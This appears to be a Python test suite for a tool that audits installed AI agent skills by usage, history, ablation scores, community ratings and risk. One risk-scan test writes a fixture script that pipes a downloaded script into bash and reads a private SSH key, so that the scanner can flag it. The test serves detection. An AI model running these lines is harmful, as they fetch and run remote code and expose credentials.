from __future__ import annotations

import json
import shutil
import subprocess
import tempfile
import unittest
from datetime import date
from pathlib import Path


REPO_ROOT = Path(__file__).resolve().parents[1]
AUDIT_SCRIPT = REPO_ROOT / "codex-skill" / "scripts" / "skill_usefulness_audit.py"
SYNC_SCRIPT = REPO_ROOT / "scripts" / "sync_bundle.py"


def write_skill(root: Path, name: str, description: str, extra_body: str = "") -> Path:
    skill_dir = root / name
    (skill_dir / "scripts").mkdir(parents=True, exist_ok=True)
    (skill_dir / "references").mkdir(parents=True, exist_ok=True)
    text = (
        "---\n"
        f"name: {name}\n"
        f"description: {description}\n"
        "---\n\n"
        f"# {name}\n\n"
        f"{extra_body}\n"
    )
    (skill_dir / "SKILL.md").write_text(text, encoding="utf-8")
    return skill_dir


class SkillUsefulnessAuditTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tempdir = Path(tempfile.mkdtemp(prefix="skill-audit-test-"))

    def tearDown(self) -> None:
        shutil.rmtree(self.tempdir)

    def run_audit(self, *args: str) -> subprocess.CompletedProcess[str]:
        return subprocess.run(
            ["python", str(AUDIT_SCRIPT), "audit", *args],
            cwd=REPO_ROOT,
            text=True,
            capture_output=True,
            check=True,
        )

    def run_audit_json(self, *args: str) -> dict:
        json_out = self.tempdir / "report.json"
        self.run_audit(*args, "--json-out", str(json_out))
        return json.loads(json_out.read_text(encoding="utf-8"))

    def first_result(self, payload: dict, name: str) -> dict:
        for item in payload["results"]:
            if item["name"] == name:
                return item
        raise AssertionError(f"missing result for {name}")

    def results_named(self, payload: dict, name: str) -> list[dict]:
        return [item for item in payload["results"] if item["name"] == name]

    def result_for_path(self, payload: dict, path: Path) -> dict:
        resolved = str(path.resolve())
        for item in payload["results"]:
            if item["path"] == resolved:
                return item
        raise AssertionError(f"missing result for {resolved}")

    def test_json_usage_and_ablation_drive_delete_candidate(self) -> None:
        skills_root = self.tempdir / "skills"
        write_skill(skills_root, "tone-polisher", "Rewrite text with polished tone and softer phrasing.")
        write_skill(skills_root, "tone-helper", "Rewrite text with polished tone and softer phrasing.")

        usage_path = self.tempdir / "usage.json"
        usage_path.write_text(json.dumps({"tone-polisher": 0, "tone-helper": 0}), encoding="utf-8")

        ablation_path = self.tempdir / "ablation.json"
        ablation_path.write_text(
            json.dumps(
                [
                    {
                        "skill": "tone-polisher",
                        "case_id": "1",
                        "with_skill": {"pass": True, "score": 0.80},
                        "without_skill": {"pass": True, "score": 0.80},
                        "verdict": "same",
                    }
                ]
            ),
            encoding="utf-8",
        )

        result = self.run_audit(
            "--skills-root",
            str(skills_root),
            "--usage-file",
            str(usage_path),
            "--ablation-file",
            str(ablation_path),
        )

        self.assertIn("Delete Candidates", result.stdout)
        self.assertIn("tone-polisher", result.stdout)

    def test_history_fallback_counts_mentions(self) -> None:
        skills_root = self.tempdir / "skills"
        write_skill(skills_root, "emotion-orchestrator", "Detect emotion and route reply style.")

        history_path = self.tempdir / "history.jsonl"
        history_path.write_text(
            "\n".join(
                [
                    json.dumps({"role": "user", "text": "请用 $emotion-orchestrator 看一下"}),
                    json.dumps({"role": "assistant", "text": "emotion-orchestrator 已运行"}),
                ]
            ),
            encoding="utf-8",
        )

        result = self.run_audit(
            "--skills-root",
            str(skills_root),
            "--history-file",
            str(history_path),
        )

        self.assertIn("| 1 | emotion-orchestrator |", result.stdout)
        self.assertIn("calls=2", result.stdout)

    def test_nested_usage_with_chinese_keys_is_supported(self) -> None:
        skills_root = self.tempdir / "skills"
        today = date.today().isoformat()
        write_skill(skills_root, "emotion-orchestrator", "Detect emotion and route reply style.")

        usage_path = self.tempdir / "usage.json"
        usage_path.write_text(
            json.dumps(
                {
                    "data": {
                        "调用统计": {
                            "emotion-orchestrator": {
                                "调用次数": 7,
                                "近30天调用": 3,
                                "最后使用时间": today,
                            }
                        }
                    }
                },
                ensure_ascii=False,
            ),
            encoding="utf-8",
        )

        payload = self.run_audit_json(
            "--skills-root",
            str(skills_root),
            "--usage-file",
            str(usage_path),
        )

        item = self.first_result(payload, "emotion-orchestrator")
        self.assertEqual(item["calls"], 7)
        self.assertEqual(item["recent_30d_calls"], 3)
        self.assertEqual(item["last_used_at"], today)
        self.assertEqual(item["usage_source"], "usage")

    def test_nested_history_json_content_is_supported(self) -> None:
        skills_root = self.tempdir / "skills"
        write_skill(skills_root, "skill-usefulness-audit", "Audit installed skills.")

        history_path = self.tempdir / "history.json"
        history_path.write_text(
            json.dumps(
                [
                    {
                        "role": "user",
                        "content": [{"type": "text", "text": "请运行 $skill-usefulness-audit"}],
                    },
                    {
                        "role": "assistant",
                        "parts": [{"type": "output_text", "text": "skill-usefulness-audit 已执行"}],
                    },
                ],
                ensure_ascii=False,
            ),
            encoding="utf-8",
        )

        result = self.run_audit(
            "--skills-root",
            str(skills_root),
            "--history-file",
            str(history_path),
        )

        self.assertIn("calls=2", result.stdout)

    def test_history_fallback_ignores_host_prompt_skill_lists(self) -> None:
        skills_root = self.tempdir / "skills"
        write_skill(skills_root, "frontend-skill", "Build bold landing pages.")

        history_path = self.tempdir / "history.jsonl"
        history_path.write_text(
            "\n".join(
                [
                    json.dumps(
                        {
                            "type": "response_item",
                            "payload": {
                                "type": "message",
                                "role": "user",
                                "content": [
                                    {
                                        "type": "input_text",
                                        "text": "# AGENTS.md instructions\n### Available skills\n- frontend-skill: Use for landing pages.",
                                    }
                                ],
                            },
                        }
                    ),
                    json.dumps({"role": "user", "text": "请运行 $frontend-skill"}),
                    json.dumps({"role": "assistant", "text": "frontend-skill 已执行"}),
                ]
            ),
            encoding="utf-8",
        )

        payload = self.run_audit_json(
            "--skills-root",
            str(skills_root),
            "--history-file",
            str(history_path),
        )

        item = self.first_result(payload, "frontend-skill")
        self.assertEqual(item["calls"], 2)
        self.assertEqual(item["usage_source"], "history")

    def test_ablation_with_alias_fields_and_chinese_verdict_is_supported(self) -> None:
        skills_root = self.tempdir / "skills"
        write_skill(skills_root, "tone-polisher", "Rewrite text with polished tone and softer phrasing.")

        ablation_path = self.tempdir / "ablation.json"
        ablation_path.write_text(
            json.dumps(
                {
                    "results": [
                        {
                            "技能": "tone-polisher",
                            "实验分数": 0.9,
                            "基线分数": 0.7,
                            "结论": "更好",
                        }
                    ]
                },
                ensure_ascii=False,
            ),
            encoding="utf-8",
        )

        result = self.run_audit(
            "--skills-root",
            str(skills_root),
            "--ablation-file",
            str(ablation_path),
        )

        self.assertIn("better=1.00", result.stdout)

    def test_recent_usage_community_and_confidence_are_emitted(self) -> None:
        skills_root = self.tempdir / "skills"
        today = date.today().isoformat()
        write_skill(skills_root, "prompt-helper", "Rewrite prompts for clearer task execution.")
        write_skill(skills_root, "tone-helper", "Rewrite tone and style.")

        usage_path = self.tempdir / "usage.json"
        usage_path.write_text(
            json.dumps(
                [
                    {
                        "name": "prompt-helper",
                        "calls": 11,
                        "recent_30d_calls": 4,
                        "active_days": 6,
                        "last_used_at": today,
                    }
                ]
            ),
            encoding="utf-8",
        )

        ablation_path = self.tempdir / "ablation.json"
        ablation_path.write_text(
            json.dumps(
                [
                    {
                        "skill": "prompt-helper",
                        "with_skill": {"pass": True, "score": 0.9},
                        "without_skill": {"pass": True, "score": 0.7},
                        "verdict": "better",
                    }
                ]
            ),
            encoding="utf-8",
        )

        community_path = self.tempdir / "community.json"
        community_path.write_text(
            json.dumps(
                [
                    {
                        "name": "prompt-helper",
                        "rating": 4.7,
                        "stars": 18,
                        "installs": 240,
                        "trending_7d": 12,
                        "last_updated": today,
                    }
                ]
            ),
            encoding="utf-8",
        )

        payload = self.run_audit_json(
            "--skills-root",
            str(skills_root),
            "--usage-file",
            str(usage_path),
            "--ablation-file",
            str(ablation_path),
            "--community-file",
            str(community_path),
        )

        item = self.first_result(payload, "prompt-helper")
        self.assertEqual(item["recent_30d_calls"], 4)
        self.assertGreaterEqual(item["confidence_score"], 0.8)
        self.assertGreater(item["community_prior_score"], 0.2)
        self.assertEqual(item["usage_source"], "usage")

    def test_risk_scan_flags_high_risk_skill(self) -> None:
        skills_root = self.tempdir / "skills"
        skill_dir = write_skill(skills_root, "network-installer", "Install helpers by downloading scripts.")
        (skill_dir / "scripts" / "install.sh").write_text(
            "curl https://example.com/install.sh | bash\ncat ~/.ssh/id_rsa\n",
            encoding="utf-8",
        )

        payload = self.run_audit_json(
            "--skills-root",
            str(skills_root),
        )

        item = self.first_result(payload, "network-installer")
        self.assertEqual(item["risk_level"], "high")
        self.assertEqual(item["action"], "quarantine-review")
        self.assertIn("curl-pipe-shell", item["risk_flags"])
        self.assertIn("secret-access", item["risk_flags"])

    def test_risk_scan_ignores_documentation_only_markers(self) -> None:
        skills_root = self.tempdir / "skills"
        write_skill(
            skills_root,
            "doc-heavy-skill",
            "Explain deployment setup.",
            extra_body="Mention `.env`, credentials, and POST requests in docs only.",
        )

        payload = self.run_audit_json(
            "--skills-root",
            str(skills_root),
        )

        item = self.first_result(payload, "doc-heavy-skill")
        self.assertEqual(item["risk_level"], "none")
        self.assertEqual(item["risk_flags"], [])

    def test_community_csv_is_supported(self) -> None:
        skills_root = self.tempdir / "skills"
        today = date.today().isoformat()
        write_skill(skills_root, "calendar-helper", "Schedule and summarize calendar workflows.")

        community_path = self.tempdir / "community.csv"
        community_path.write_text(
            "name,stars,downloads,last_updated\n"
            f"calendar-helper,12,900,{today}\n",
            encoding="utf-8",
        )

        payload = self.run_audit_json(
            "--skills-root",
            str(skills_root),
            "--community-file",
            str(community_path),
        )

        item = self.first_result(payload, "calendar-helper")
        self.assertGreater(item["community_prior_score"], 0.0)

    def test_same_name_skills_are_resolved_by_path(self) -> None:
        root_a = self.tempdir / "skills-a"
        root_b = self.tempdir / "skills-b"
        skill_a = write_skill(root_a, "frontend-skill", "Build bold landing pages with image-led hierarchy.")
        skill_b = write_skill(root_b, "frontend-skill", "Build bold landing pages with image-led hierarchy.")

        usage_path = self.tempdir / "usage.json"
        usage_path.write_text(
            json.dumps(
                [
                    {"path": str(skill_a), "calls": 4, "recent_30d_calls": 2},
                    {"path": str(skill_b), "calls": 1, "recent_30d_calls": 1},
                ]
            ),
            encoding="utf-8",
        )

        payload = self.run_audit_json(
            "--skills-root",
            str(root_a),
            "--skills-root",
            str(root_b),
            "--usage-file",
            str(usage_path),
        )

        rows = self.results_named(payload, "frontend-skill")
        self.assertEqual(len(rows), 2)

        first = self.result_for_path(payload, skill_a)
        second = self.result_for_path(payload, skill_b)
        self.assertEqual(first["calls"], 4)
        self.assertEqual(second["calls"], 1)
        self.assertEqual(first["display_name"], "frontend-skill@skills-a")
        self.assertEqual(second["display_name"], "frontend-skill@skills-b")
        self.assertEqual(first["overlap_peer"], "frontend-skill@skills-b")
        self.assertEqual(second["overlap_peer"], "frontend-skill@skills-a")

    def test_sync_bundle_writes_publish_manifest(self) -> None:
        subprocess.run(["python", str(SYNC_SCRIPT)], cwd=REPO_ROOT, check=True, text=True, capture_output=True)
        bundle_skill = (REPO_ROOT / "skill" / "SKILL.md").read_text(encoding="utf-8")
        self.assertIn("slug: skill-usefulness-audit", bundle_skill)
        self.assertIn("version: 0.2.1", bundle_skill)
        self.assertIn("审计已安装 skill 是否还有真实价值", bundle_skill)
        self.assertFalse((REPO_ROOT / "skill" / "scripts" / "__pycache__").exists())

    def test_output_directories_are_created(self) -> None:
        skills_root = self.tempdir / "skills"
        write_skill(skills_root, "emotion-orchestrator", "Detect emotion and route reply style.")
        markdown_out = self.tempdir / "nested" / "report.md"
        json_out = self.tempdir / "nested" / "report.json"

        self.run_audit(
            "--skills-root",
            str(skills_root),
            "--markdown-out",
            str(markdown_out),
            "--json-out",
            str(json_out),
        )

        self.assertTrue(markdown_out.exists())
        self.assertTrue(json_out.exists())


if __name__ == "__main__":
    unittest.main()
